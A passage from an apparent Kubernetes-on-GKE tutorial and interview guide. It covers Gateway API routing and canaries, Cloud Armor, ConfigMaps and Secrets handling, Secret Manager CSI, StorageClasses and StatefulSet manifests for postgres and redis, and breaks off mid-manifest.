Every controller filled these gaps with **its own annotations**, so `nginx.ingress.kubernetes.io/canary-weight` and `alb.ingress.kubernetes.io/...` and `cloud.google.com/...` are all mutually incompatible. **Ingress is a portable API with non-portable behaviour.** That is exactly the problem Gateway API was created to fix, and stating it that way is the right answer to "what's wrong with Ingress?"

## 10.5 Gateway API — the replacement

Gateway API's central idea is **role separation**:

| Resource | Owned by | Purpose |
|---|---|---|
| **GatewayClass** | Infrastructure provider | "This is what a GKE L7 LB is" |
| **Gateway** | **Platform team** | The actual LB: IP, listeners, ports, TLS |
| **HTTPRoute** | **Application team** | Routing rules, attached to a Gateway |
| **ReferenceGrant** | Target namespace owner | Explicit permission for a cross-namespace reference |

The platform team owns one Gateway in the `platform` namespace. App teams create HTTPRoutes in **their own** namespaces and attach to it. No app team can change the LB's TLS policy or IP; no platform team is a bottleneck for a route change. **Ingress cannot express this at all** — that's the point.

Enable on GKE:

```bash
gcloud container clusters update $CLUSTER --region=$REGION --gateway-api=standard
kubectl get gatewayclass
```

`10-ingress/10-gateway.yaml` — platform team:

```yaml
apiVersion: gateway.networking.k8s.io/v1
kind: Gateway
metadata:
  name: shopwave-gateway
  namespace: platform
  annotations:
    networking.gke.io/certmap: shopwave-certmap
spec:
  gatewayClassName: gke-l7-global-external-managed
  addresses:
    - type: NamedAddress
      value: shopwave-ingress-ip
  listeners:
    - name: http
      protocol: HTTP
      port: 80
      allowedRoutes:
        namespaces:
          from: Selector
          selector:
            matchLabels:
              team: shopwave
    - name: https
      protocol: HTTPS
      port: 443
      tls:
        mode: Terminate
        certificateRefs:
          - kind: Secret
            name: shopwave-tls
            namespace: platform
      allowedRoutes:
        namespaces:
          from: Selector
          selector:
            matchLabels:
              team: shopwave
```

`10-ingress/11-httproute.yaml` — app team:

```yaml
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: shopwave-routes
  namespace: shopwave-prod
spec:
  parentRefs:
    - name: shopwave-gateway
      namespace: platform
      sectionName: https
  hostnames:
    - shop.example.com
  rules:
    - matches:
        - path:
            type: PathPrefix
            value: /api/products
      backendRefs:
        - name: catalog
          port: 8080
      timeouts:
        request: 10s
        backendRequest: 8s

    - matches:
        - path:
            type: PathPrefix
            value: /api/orders
      backendRefs:
        - name: orders
          port: 8080
      timeouts:
        request: 30s

    - matches:
        - path:
            type: PathPrefix
            value: /
      backendRefs:
        - name: frontend
          port: 80
```

### The canary Gateway API actually gives you

```yaml
    - matches:
        - path:
            type: PathPrefix
            value: /api/products
      backendRefs:
        - name: catalog
          port: 8080
          weight: 90
        - name: catalog-canary
          port: 8080
          weight: 10
```

**10% of traffic, with 3 replicas.** Compare with the replica-ratio hack from Part 8, where 10% requires 10 pods. **Weight is decoupled from replica count** — that is the single most useful thing Gateway API adds, and it's the honest answer to "how do you canary in Kubernetes."

Header-based routing (A/B, or "internal users get v2"):

```yaml
    - matches:
        - path:
            type: PathPrefix
            value: /api/products
          headers:
            - type: Exact
              name: x-shopwave-channel
              value: beta
      backendRefs:
        - name: catalog-canary
          port: 8080
```

Cross-namespace requires explicit consent — `10-ingress/12-referencegrant.yaml`:

```yaml
apiVersion: gateway.networking.k8s.io/v1beta1
kind: ReferenceGrant
metadata:
  name: allow-platform-gateway
  namespace: shopwave-prod
spec:
  from:
    - group: gateway.networking.k8s.io
      kind: HTTPRoute
      namespace: platform
  to:
    - group: ""
      kind: Service
```

> **ReferenceGrant closes a real Ingress vulnerability.** With Ingress, if a controller supported cross-namespace backends, a malicious tenant could route traffic to **your** Service without asking. Gateway API makes the **target namespace** grant permission explicitly. Security-by-default, expressed in the API.

**Gateway API status is where the truth lives:**

```bash
kubectl describe gateway shopwave-gateway -n platform
kubectl describe httproute shopwave-routes -n shopwave-prod
```

Look at `status.parents[].conditions`: `Accepted`, `ResolvedRefs`, `Programmed`. `ResolvedRefs=False` with `BackendNotFound` is usually a missing ReferenceGrant or a typo'd Service. This structured status is another thing Ingress never had — with Ingress, "why isn't it working" meant reading GCP console logs.

## 10.6 Cloud Armor

```bash
gcloud compute security-policies create shopwave-armor-policy \
  --description="Shopwave WAF"

# OWASP preconfigured rules
gcloud compute security-policies rules create 1000 \
  --security-policy=shopwave-armor-policy \
  --expression="evaluatePreconfiguredExpr('sqli-v33-stable')" \
  --action=deny-403

gcloud compute security-policies rules create 1001 \
  --security-policy=shopwave-armor-policy \
  --expression="evaluatePreconfiguredExpr('xss-v33-stable')" \
  --action=deny-403

# Rate limiting per client IP
gcloud compute security-policies rules create 2000 \
  --security-policy=shopwave-armor-policy \
  --expression="true" \
  --action=rate-based-ban \
  --rate-limit-threshold-count=100 \
  --rate-limit-threshold-interval-sec=60 \
  --ban-duration-sec=600 \
  --conform-action=allow \
  --exceed-action=deny-429 \
  --enforce-on-key=IP
```

Attached via the BackendConfig's `securityPolicy` field (Part 9).

> **Cloud Armor runs at Google's edge — the attack never reaches your VPC, let alone your pods.** That is the whole argument for edge WAF over in-cluster WAF: you are not paying to ingest, route, and process an attack you're going to drop anyway. During a volumetric attack, an in-cluster WAF is itself the thing that falls over.

## 10.7 Verify

```bash
kubectl apply -f 10-ingress/
kubectl get ingress -n shopwave-prod
kubectl describe ingress shopwave -n shopwave-prod
kubectl get managedcertificate -n shopwave-prod

# GCP side
gcloud compute backend-services list
gcloud compute backend-services get-health <backend-name> --global
gcloud compute url-maps list
```

### When the Ingress "doesn't work" — the checklist

Nearly every GKE Ingress problem is one of these five:

1. **Backend `UNHEALTHY`** → the firewall rule for `35.191.0.0/16, 130.211.0.0/22` is missing. **This is #1 by a wide margin.** (Part 1)
2. **Health check hits the wrong path** → GCE's default health check probes `/` and expects a 200. If `/` returns a 302 or 401, the backend is permanently unhealthy while the app is fine. Fix with a **BackendConfig** pointing at `/readyz`. **This is #2.**
3. **Cert stuck `Provisioning` / `FailedNotVisible`** → DNS doesn't resolve to the LB IP yet.
4. **Random 502s** → your backend's keepalive is shorter than the LB's idle timeout. (Part 4: `keepalive = 65`.)
5. **502s during deploys** → the termination race. `preStop` sleep + NEG readiness gates. (Parts 7 and 9.)

> **The GCE Ingress controller is slow.** It reconciles a real GCP load balancer — url-map, backend services, health checks, forwarding rules, target proxies, certificates. **Five to ten minutes for the first Ingress is normal, not a bug.** Watch `kubectl describe ingress` events; it narrates each GCP object as it creates it. Candidates who apply an Ingress and declare it broken after 60 seconds are telling on themselves.

## 10.8 Part 10 interview talking points

- Reserve a static IP; ephemeral IPs are lost forever
- Managed cert constraints: 15–60 min, DNS-first, no wildcards, `FailedNotVisible` = DNS
- HTTPS redirect at the LB via FrontendConfig, not in the app
- `pathType`: Prefix is **segment-based**; `ImplementationSpecific` is portability poison
- **Ingress's real problem**: a portable API with non-portable behaviour, all features hidden in vendor annotations
- Gateway API's **role separation** — GatewayClass / Gateway / HTTPRoute / ReferenceGrant
- Weighted `backendRefs` decouple canary % from replica count
- ReferenceGrant closes the cross-namespace consent hole
- Cloud Armor at the edge vs in-cluster WAF
- The five-item Ingress failure checklist — health-check firewall, health-check path, DNS, keepalive, termination race


---

# Part 11 — ConfigMaps and Secrets

## 11.1 ConfigMaps

`04-config/00-catalog.yaml`:

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: catalog-config
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: catalog
    app.kubernetes.io/part-of: shopwave
data:
  DB_HOST: "postgres"
  DB_PORT: "5432"
  DB_NAME: "shopwave"
  DB_USER: "shopwave"
  CACHE_TTL_SECONDS: "60"
  STARTUP_DELAY_SECONDS: "5"
  DRAIN_SECONDS: "8"
  LOG_LEVEL: "info"
  GUNICORN_WORKERS: "2"
  GUNICORN_THREADS: "4"
  APP_VERSION: "1.0.0"
```

`04-config/01-frontend.yaml`:

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: frontend-config
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: frontend
    app.kubernetes.io/part-of: shopwave
data:
  CATALOG_URL: "http://catalog:8080"
  CART_URL: "http://cart:8080"
  ORDERS_URL: "http://orders:8080"
  LOG_LEVEL: "info"
  GUNICORN_WORKERS: "4"
  APP_VERSION: "1.0.0"
```

`04-config/02-cart.yaml`:

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: cart-config
  namespace: shopwave-prod
data:
  REDIS_HOST: "redis-0.redis-headless"
  REDIS_PORT: "6379"
  CART_TTL_SECONDS: "1800"
  CATALOG_URL: "http://catalog:8080"
  LOG_LEVEL: "info"
  APP_VERSION: "1.0.0"
```

`04-config/03-orders.yaml`:

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: orders-config
  namespace: shopwave-prod
data:
  DB_HOST: "postgres"
  DB_NAME: "shopwave"
  DB_USER: "shopwave"
  DB_POOL_MAX: "8"
  CART_URL: "http://cart:8080"
  PAYMENTS_URL: "http://payments:8080"
  INVENTORY_URL: "http://inventory:8080"
  LOG_LEVEL: "info"
  APP_VERSION: "1.0.0"
```

`04-config/04-payments.yaml`:

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: payments-config
  namespace: shopwave-prod
data:
  SIMULATED_LATENCY_SECONDS: "0.3"
  SIMULATED_FAILURE_RATE: "0.05"
  LOG_LEVEL: "info"
  APP_VERSION: "1.0.0"
```

`04-config/05-inventory.yaml`:

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: inventory-config
  namespace: shopwave-prod
data:
  LEASE_NAME: "inventory-reconciler"
  LEASE_DURATION_SECONDS: "15"
  LEASE_RENEW_SECONDS: "5"
  LOG_LEVEL: "info"
  APP_VERSION: "1.0.0"
```

`04-config/06-notifications.yaml`:

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: notifications-config
  namespace: shopwave-prod
data:
  ORDERS_URL: "http://orders:8080"
  NOTIFY_URL: "http://notifications:8080"
  CHECKPOINT_FILE: "/state/digest.checkpoint"
  LOG_LEVEL: "info"
  APP_VERSION: "1.0.0"
```

### The two consumption modes and their **critical** difference

```yaml
# Mode A: environment variables
envFrom:
  - configMapRef:
      name: catalog-config

# Mode B: a volume
volumeMounts:
  - name: config
    mountPath: /etc/config
    readOnly: true
volumes:
  - name: config
    configMap:
      name: catalog-config
```

> **This is the most important ConfigMap fact and it is asked constantly:**
>
> **Environment variables are injected once, at container start. They NEVER update.** Edit the ConfigMap and the running pod keeps the old values forever.
>
> **Volume-mounted ConfigMaps DO update in place** — the kubelet syncs them, typically within `syncFrequency` (~60s) + cache TTL, so ~1–2 minutes. Your app must **watch the file** or re-read it to benefit.
>
> So: `kubectl edit configmap` changes nothing for an env-var consumer, and the human then spends 40 minutes wondering why. Meanwhile a volume consumer silently picks up a half-written config at an arbitrary moment.

**How the volume update actually works** (a great deep-dive answer): the kubelet writes the new content to a **timestamped hidden directory**, then **atomically swaps a symlink** (`..data`). So your app never sees a partially-written file — it sees the old one, then the new one. That's why the mount looks like `..2024_01_01_12_00_00.123456789/` with symlinks. It also means **`subPath` mounts do NOT update** — a `subPath` mount resolves the symlink at mount time and is then frozen. That last one is a truly nasty gotcha:

```yaml
# THIS NEVER UPDATES. Ever.
volumeMounts:
  - name: config
    mountPath: /app/config.yaml
    subPath: config.yaml
```

### The correct pattern: make config changes trigger a rollout

For an env-var consumer, the enterprise answer is:

```bash
kubectl rollout restart deploy/catalog -n shopwave-prod
```

Better, and the reason to do it this way: put a **checksum annotation** on the pod template, so a config change **is** a spec change and rolls out automatically with all your normal safety (maxSurge, minReadySeconds, progressDeadline, rollback):

```yaml
template:
  metadata:
    annotations:
      shopwave.io/config-checksum: "a3f1c9e8"   # hash of the ConfigMap content
```

That's what Helm's `checksum/config` annotation does. **We're not using Helm, so you compute it and commit it** — which is honest, auditable, and reviewable in a PR.

### Immutable ConfigMaps

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: catalog-config-v3
  namespace: shopwave-prod
immutable: true
data:
  LOG_LEVEL: "info"
```

> **`immutable: true` is a performance feature, not just a safety one.** Every kubelet running a pod that mounts a ConfigMap holds a **watch** on it. Thousands of pods = thousands of watches, and the API server tracks every one. Marking it immutable lets the kubelet **stop watching entirely** — a documented, significant reduction in API-server load on large clusters. The pattern is: **versioned, immutable ConfigMaps** (`-v1`, `-v2`, `-v3`) referenced by name from the Deployment, so a config change **is** a Deployment change. You get rollback of config for free, because rolling back the Deployment rolls back the ConfigMap reference.

### Limits

- **1 MiB per ConfigMap** — an etcd object-size limit, not arbitrary. Big config → mount a volume or an init container that fetches it.
- ConfigMaps are **namespaced** and cannot be referenced across namespaces.
- A pod referencing a **missing** ConfigMap stays in `CreateContainerConfigError` (or Pending) forever. Use `optional: true` if it genuinely is.

## 11.2 Secrets — and their honest limitations

`05-secrets/00-postgres.yaml`:

```yaml
apiVersion: v1
kind: Secret
metadata:
  name: postgres-credentials
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: postgres
    app.kubernetes.io/part-of: shopwave
type: Opaque
stringData:
  username: shopwave
  password: CHANGE_ME_AND_DO_NOT_COMMIT
  POSTGRES_DB: shopwave
```

> **`stringData` vs `data`.** `data` requires base64. `stringData` is write-only convenience — the API server base64s it for you and it never appears when you read the object back. Use `stringData` in manifests you write by hand; it removes a whole class of "I base64'd the trailing newline" bugs.

> **`echo -n`, not `echo`.** `echo "pw" | base64` encodes `pw\n` — with the newline. Your password is now wrong by one invisible character and the error is "authentication failed". This wastes an hour of somebody's life every single week, somewhere in the world.

### Say this clearly in an interview

> **"A Kubernetes Secret is base64-encoded, not encrypted. Base64 is an encoding, not a cipher. Anyone with `get secrets` in the namespace has the plaintext, and by default it is stored **unencrypted in etcd**."**
>
> Three consequences:
> 1. `get secrets` RBAC ≈ full credential access. Grant it to nobody by default. (Our developer Role deliberately omits it.)
> 2. An etcd backup is a **credential dump**. Treat it accordingly.
> 3. Secrets in git are secrets in the world, forever, even after the "fix" commit.
>
> **What GKE does about it:** Application-layer Secrets Encryption, which encrypts Secret objects with a **Cloud KMS** key before they reach etcd:
> ```bash
> gcloud container clusters update $CLUSTER --region=$REGION \
>   --database-encryption-key=projects/$PROJECT_ID/locations/$REGION/keyRings/shopwave/cryptoKeys/etcd-key
> ```
> This is envelope encryption: KMS holds the KEK, the DEK encrypts the object. It protects against etcd-at-rest and backup exposure. It does **not** protect against `kubectl get secret` — that's RBAC's job.

### The real answer: don't put the secret in Kubernetes at all

## 11.3 Secret Manager CSI driver

```bash
gcloud services enable secretmanager.googleapis.com

kubectl apply -f https://raw.githubusercontent.com/kubernetes-sigs/secrets-store-csi-driver/main/deploy/rbac-secretproviderclass.yaml
# (plus the GCP provider DaemonSet in the `platform` namespace)

# Create the actual secret in Secret Manager
echo -n "sk_live_REDACTED" | gcloud secrets create shopwave-stripe-key \
  --data-file=- \
  --replication-policy=user-managed \
  --locations=$REGION

gcloud secrets add-iam-policy-binding shopwave-stripe-key \
  --member="serviceAccount:shopwave-payments@$PROJECT_ID.iam.gserviceaccount.com" \
  --role="roles/secretmanager.secretAccessor"
```

`05-secrets/10-secretproviderclass.yaml`:

```yaml
apiVersion: secrets-store.csi.x-k8s.io/v1
kind: SecretProviderClass
metadata:
  name: shopwave-stripe
  namespace: shopwave-prod
spec:
  provider: gcp
  parameters:
    secrets: |
      - resourceName: "projects/kubernetas-console/secrets/shopwave-stripe-key/versions/latest"
        path: "stripe-api-key"
```

Consumed by `payments` (Part 8):

```yaml
volumes:
  - name: stripe-secret
    csi:
      driver: secrets-store.csi.k8s.io
      readOnly: true
      volumeAttributes:
        secretProviderClass: shopwave-stripe
volumeMounts:
  - name: stripe-secret
    mountPath: /etc/secrets
    readOnly: true
```

### Why this is strictly better

| | K8s Secret | Secret Manager CSI |
|---|---|---|
| Stored in etcd | **Yes** | **No** — fetched at mount time, held in tmpfs |
| In an etcd backup | Yes | No |
| Visible to `get secrets` | Yes | **No — there is no Secret object** |
| Rotation | Manual, then restart every pod | Change the version in Secret Manager; the driver **rotates the file** |
| Audit trail of access | Kubernetes audit only | **Cloud Audit Logs — per access, per identity** |
| Versioning | None | Full version history + rollback |
| Auth | RBAC | **Workload Identity** — no keys anywhere |

> **The subtlety that connects back to Part 4.** The CSI driver rotates the **file** in place. If your app read the secret once at startup into a variable, **you keep using a revoked key** — and the failure appears hours later, disconnected from the rotation that caused it. That is exactly why `payments.py`'s `api_key()` re-reads the file on **every** call. Rotation only works if the application cooperates. Almost nobody thinks about this half.

> **`versions/latest` is a real trade-off.** It picks up rotations automatically — and it also means a bad rotation instantly breaks every pod with no rollout to undo. Pinning `versions/7` is safer and turns rotation into a reviewed manifest change. **Pin in prod; use `latest` in dev.**

## 11.4 Part 11 interview talking points

- **Env-var ConfigMaps never update. Volume-mounted ones do.** The `..data` symlink swap; why it's atomic
- **`subPath` mounts never update** — a genuinely nasty one
- Checksum annotation on the pod template so config changes roll out with normal safety
- `immutable: true` removes kubelet watches — a real API-server scaling lever
- Versioned immutable ConfigMaps = config rollback for free
- 1 MiB etcd object limit
- **"Secrets are encoded, not encrypted"** and the three consequences
- `stringData` vs `data`; `echo -n`
- GKE Application-layer Secrets Encryption with Cloud KMS — what it does and doesn't protect
- Secret Manager CSI: nothing in etcd, WI auth, per-access audit, real rotation
- Why the **application** must re-read the file for rotation to mean anything
- `versions/latest` vs pinning


---

# Part 12 — Storage and StatefulSets

## 12.1 StorageClasses

`06-storage/00-storageclass.yaml`:

```yaml
apiVersion: storage.k8s.io/v1
kind: StorageClass
metadata:
  name: shopwave-ssd-retain
  labels:
    app.kubernetes.io/part-of: shopwave
provisioner: pd.csi.storage.gke.io
parameters:
  type: pd-standard   # FREE TIER: pd-standard avoids the SSD disk quota; prod would use pd-ssd
  replication-type: none
volumeBindingMode: WaitForFirstConsumer
allowVolumeExpansion: true
reclaimPolicy: Retain
---
apiVersion: storage.k8s.io/v1
kind: StorageClass
metadata:
  name: shopwave-balanced-delete
provisioner: pd.csi.storage.gke.io
parameters:
  type: pd-standard   # FREE TIER: was pd-balanced
volumeBindingMode: WaitForFirstConsumer
allowVolumeExpansion: true
reclaimPolicy: Delete
---
apiVersion: storage.k8s.io/v1
kind: StorageClass
metadata:
  name: shopwave-regional-ssd
provisioner: pd.csi.storage.gke.io
parameters:
  type: pd-ssd
  replication-type: regional-pd
volumeBindingMode: WaitForFirstConsumer
allowVolumeExpansion: true
reclaimPolicy: Retain
allowedTopologies:
  - matchLabelExpressions:
      - key: topology.gke.io/zone
        values:
          - asia-south1-a
          - asia-south1-b
```

### The three fields that matter

**`volumeBindingMode: WaitForFirstConsumer` — never use `Immediate` for zonal disks.**

> With `Immediate`, the PV is provisioned **the moment the PVC is created**, in **some** zone the provisioner picks. The scheduler then has to place the pod in **that** zone — but it may have no capacity there, or the pod may have a `nodeSelector`/affinity pointing elsewhere. Result: **`Pending` forever**, with events saying `node(s) had volume node affinity conflict`. The disk is in `asia-south1-a` and the only node with room is in `-c`, and neither can move.
>
> `WaitForFirstConsumer` **inverts the order**: the scheduler picks the node **first**, considering CPU, memory, affinity, taints, everything — and **then** the disk is provisioned in that node's zone. It is the correct answer 99% of the time and it is the #1 cause of unschedulable StatefulSets in the wild.

**`reclaimPolicy`:**

| Policy | On PVC delete |
|---|---|
| `Delete` | The **PV and the underlying GCP disk are destroyed**. Data gone. |
| `Retain` | PV goes to `Released`; **disk survives**; you manually recover. |

> **The default GKE StorageClass (`standard-rwo`) is `reclaimPolicy: Delete`.** So `kubectl delete pvc` on your production database **deletes the disk**. That is the correct default for a scratch cache and a catastrophe for Postgres. **Databases get `Retain`.** Full stop.
>
> **The recovery dance for a `Released` PV** (worth knowing, because someone will ask): a Released PV **cannot be re-bound** — it keeps a `claimRef` pointing at the dead PVC. You must `kubectl edit pv <name>` and **delete the `spec.claimRef` block**; the PV then goes `Available` and a new PVC can bind it. Non-obvious and genuinely useful.

**`allowVolumeExpansion: true`** — you cannot add this retroactively to bound volumes' behaviour without setting it before you need it. Set it on day one on every class. **You can grow a PVC; you can never shrink one.**

## 12.2 `postgres` StatefulSet

`07-stateful/00-postgres.yaml`:

```yaml
apiVersion: v1
kind: Service
metadata:
  name: postgres-headless
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: postgres
    app.kubernetes.io/part-of: shopwave
spec:
  clusterIP: None
  publishNotReadyAddresses: true
  selector:
    app.kubernetes.io/name: postgres
  ports:
    - name: postgres
      port: 5432
      targetPort: postgres
---
apiVersion: v1
kind: Service
metadata:
  name: postgres
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: postgres
    app.kubernetes.io/part-of: shopwave
spec:
  type: ClusterIP
  selector:
    app.kubernetes.io/name: postgres
  ports:
    - name: postgres
      port: 5432
      targetPort: postgres
---
apiVersion: apps/v1
kind: StatefulSet
metadata:
  name: postgres
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: postgres
    app.kubernetes.io/component: database
    app.kubernetes.io/part-of: shopwave
spec:
  serviceName: postgres-headless
  replicas: 1
  revisionHistoryLimit: 5
  podManagementPolicy: OrderedReady
  updateStrategy:
    type: RollingUpdate
    rollingUpdate:
      partition: 0
  selector:
    matchLabels:
      app.kubernetes.io/name: postgres
  template:
    metadata:
      labels:
        app.kubernetes.io/name: postgres
        app.kubernetes.io/component: database
        app.kubernetes.io/part-of: shopwave
      annotations:
        prometheus.io/scrape: "true"
        prometheus.io/port: "9187"
    spec:
      serviceAccountName: default
      automountServiceAccountToken: false
      enableServiceLinks: false
      terminationGracePeriodSeconds: 120
      priorityClassName: shopwave-critical
      securityContext:
        runAsNonRoot: true
        runAsUser: 999
        runAsGroup: 999
        fsGroup: 999
        fsGroupChangePolicy: OnRootMismatch
        seccompProfile:
          type: RuntimeDefault
      affinity:
        podAntiAffinity:
          requiredDuringSchedulingIgnoredDuringExecution:
            - labelSelector:
                matchLabels:
                  app.kubernetes.io/name: postgres
              topologyKey: kubernetes.io/hostname
      initContainers:
        - name: init-permissions
          image: busybox:1.36
          command:
            - sh
            - -c
            - |
              mkdir -p /var/lib/postgresql/data/pgdata
              chmod 0700 /var/lib/postgresql/data/pgdata
              echo "permissions set"
          securityContext:
            runAsUser: 999
            runAsGroup: 999
            allowPrivilegeEscalation: false
            capabilities:
              drop:
                - ALL
          volumeMounts:
            - name: data
              mountPath: /var/lib/postgresql/data
          resources:
            requests:
              cpu: 25m
              memory: 32Mi
            limits:
              cpu: 100m
              memory: 64Mi
      containers:
        - name: postgres
          image: postgres:16.3-alpine
          ports:
            - name: postgres
              containerPort: 5432
          env:
            - name: POSTGRES_USER
              valueFrom:
                secretKeyRef:
                  name: postgres-credentials
                  key: username
            - name: POSTGRES_PASSWORD
              valueFrom:
                secretKeyRef:
                  name: postgres-credentials
                  key: password
            - name: POSTGRES_DB
              valueFrom:
                secretKeyRef:
                  name: postgres-credentials
                  key: POSTGRES_DB
            - name: PGDATA
              value: /var/lib/postgresql/data/pgdata
            - name: POD_NAME
              valueFrom:
                fieldRef:
                  fieldPath: metadata.name
          resources:
            requests:
              cpu: 250m
              memory: 512Mi
            limits:
              cpu: "1"
              memory: 1Gi
          startupProbe:
            exec:
              command:
                - sh
                - -c
                - pg_isready -U $POSTGRES_USER -d $POSTGRES_DB -h 127.0.0.1
            periodSeconds: 5
            failureThreshold: 60
          livenessProbe:
            exec:
              command:
                - sh
                - -c
                - pg_isready -U $POSTGRES_USER -h 127.0.0.1
            periodSeconds: 15
            timeoutSeconds: 5
            failureThreshold: 5
          readinessProbe:
            exec:
              command:
                - sh
                - -c
                - psql -U $POSTGRES_USER -d $POSTGRES_DB -h 127.0.0.1 -c 'SELECT 1' > /dev/null
            periodSeconds: 10
            timeoutSeconds: 5
            failureThreshold: 3
          lifecycle:
            preStop:
              exec:
                command:
                  - sh
                  - -c
                  - pg_ctl -D "$PGDATA" -m fast -w stop
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: false
            capabilities:
              drop:
                - ALL
          volumeMounts:
            - name: data
              mountPath: /var/lib/postgresql/data
            - name: tmp
              mountPath: /tmp
            - name: run
              mountPath: /var/run/postgresql
            - name: config
              mountPath: /etc/postgresql/postgresql.conf
              subPath: postgresql.conf
              readOnly: true
      volumes:
        - name: tmp
          emptyDir: {}
        - name: run
          emptyDir: {}
        - name: config
          configMap:
            name: postgres-config
  volumeClaimTemplates:
    - metadata:
        name: data
        labels:
          app.kubernetes.io/name: postgres
          app.kubernetes.io/part-of: shopwave
      spec:
        accessModes:
          - ReadWriteOnce
        storageClassName: shopwave-ssd-retain
        resources:
          requests:
            storage: 20Gi
```

`04-config/10-postgres.yaml`:

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: postgres-config
  namespace: shopwave-prod
data:
  postgresql.conf: |
    listen_addresses = '*'
    max_connections = 100
    shared_buffers = 512MB
    effective_cache_size = 1536MB
    work_mem = 8MB
    maintenance_work_mem = 128MB
    wal_level = replica
    max_wal_size = 2GB
    min_wal_size = 256MB
    checkpoint_completion_target = 0.9
    random_page_cost = 1.1
    log_destination = 'stderr'
    logging_collector = off
    log_min_duration_statement = 500
    log_line_prefix = '%t [%p] %u@%d '
```

### The StatefulSet fields that carry the meaning

**`serviceName: postgres-headless`** — required, and it is what gives each pod its DNS name:

```
postgres-0.postgres-headless.shopwave-prod.svc.cluster.local
```

**Stable identity is the entire reason StatefulSets exist.** Three guarantees a Deployment cannot give:

1. **Stable network identity** — `postgres-0` is always `postgres-0`, forever, on any node.
2. **Stable storage** — `postgres-0` always re-attaches to `data-postgres-0`, the same disk, even if it lands on a different node in a different... no, actually, in the *same zone*, because the PD is zonal. (That's the point of `WaitForFirstConsumer` + the PV's node affinity.)
3. **Ordered, deterministic lifecycle** — 0, then 1, then 2. Reverse on scale-down.

> **The PVC naming pattern is `<volumeClaimTemplate.name>-<statefulset.name>-<ordinal>`** → `data-postgres-0`. Deterministic, which is exactly how the controller re-finds the right disk for the right pod.

**`podManagementPolicy: OrderedReady`** (default) vs `Parallel`:

- `OrderedReady` — pod N+1 is not created until pod N is **Running and Ready**. Required for primary/replica bootstrap.
- `Parallel` — all at once. Correct for a symmetric cluster (our `search`), and **much** faster: an `OrderedReady` StatefulSet of 20 pods each taking 60s to become ready takes **20 minutes** to start.

**`updateStrategy.rollingUpdate.partition`** — the canary primitive StatefulSets *do* have:

```yaml
updateStrategy:
  type: RollingUpdate
  rollingUpdate:
    partition: 2     # only pods with ordinal >= 2 are updated
```

> With `replicas: 3, partition: 2`, only `postgres-2` updates. Verify it, then set `partition: 1`, then `0`. **A manual, ordinal-based canary with a built-in kill switch** — you always update the highest ordinals first, which for a primary-at-0 topology means **you canary on a replica before you ever touch the primary**. This is genuinely elegant and very few people know `partition` exists.
>
> `updateStrategy: OnDelete` is the other option: the controller updates **nothing**; you delete pods by hand. That's the escape hatch for a database where *you* decide the failover moment.

**`terminationGracePeriodSeconds: 120` + `preStop: pg_ctl -m fast -w stop`** — a database needs to checkpoint and close cleanly. SIGKILL a Postgres and it recovers from WAL on next start, which for a large database means **minutes of downtime**. The preStop does a clean fast shutdown; the 120s budget covers it.

**`fsGroup: 999` + `fsGroupChangePolicy: OnRootMismatch`** —

> `fsGroup` makes the kubelet **recursively `chown`** the entire volume to that GID on every mount. On a 500 GB database with millions of files, that is **minutes of pod startup**, every single restart, and it looks like the pod is hung. `fsGroupChangePolicy: OnRootMismatch` makes it check the **top-level directory's** ownership first and skip the recursive walk if it already matches. This is a real, painful, well-known production problem and the fix is one line. Excellent thing to have ready.

**`readOnlyRootFilesystem: false`** for Postgres — it writes to `/var/run/postgresql` and needs a socket dir. We mount `emptyDir`s for `/tmp` and `/var/run/postgresql` but leave the root writable because the postgres image genuinely needs it. **Being honest about where you couldn't apply a control is better than pretending.**

### `accessModes` — the thing everyone gets wrong

| Mode | Meaning | GCP PD? |
|---|---|---|
| `ReadWriteOnce` (RWO) | Mounted read-write by **one node** | **Yes** |
| `ReadOnlyMany` (ROX) | Read-only by many nodes | Yes (from a snapshot) |
| `ReadWriteMany` (RWX) | Read-write by **many nodes** | **No.** Needs Filestore (NFS) |
| `ReadWriteOncePod` (RWOP) | Read-write by **exactly one POD** (1.27+) | Yes |

> **RWO means one NODE, not one POD.** Two pods on the *same node* can both mount an RWO volume read-write — and happily corrupt each other. That's what **`ReadWriteOncePod`** was added for, and it's the correct mode for a database that must never have two writers. This distinction is asked a lot and misunderstood almost universally.
>
> **A GCP Persistent Disk does not do RWX.** Every "how do I share a volume between pods?" question ends at: Filestore (managed NFS), GCS FUSE, or *rearchitect so you don't need it*. There is no clever PD trick.

## 12.3 `redis` StatefulSet

`07-stateful/01-redis.yaml`:

```yaml
apiVersion: v1
kind: Service
metadata:
  name: redis-headless
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: redis
spec:
  clusterIP: None
  publishNotReadyAddresses: true
  selector:
    app.kubernetes.io/name: redis
  ports:
    - name: redis
      port: 6379
      targetPort: redis
---
apiVersion: v1
kind: Service
metadata:
  name: redis
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: redis
spec:
  type: ClusterIP
  selector:
    app.kubernetes.io/name: redis
  ports:
    - name: redis
      port: 6379
      targetPort: redis
---
apiVersion: apps/v1
kind: StatefulSet
metadata:
  name: redis
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: redis
    app.kubernetes.io/component: cache
    app.kubernetes.io/part-of: shopwave
spec:
  serviceName: redis-headless
  replicas: 1
  podManagementPolicy: OrderedReady
  updateStrategy:
    type: RollingUpdate
  selector:
    matchLabels:
      app.kubernetes.io/name: redis
  template:
    metadata:
      labels:
        app.kubernetes.io/name: redis
        app.kubernetes.io/component: cache
        app.kubernetes.io/part-of: shopwave
    spec:
      automountServiceAccountToken: false
      enableServiceLinks: false
      terminationGracePeriodSeconds: 45
      securityContext:
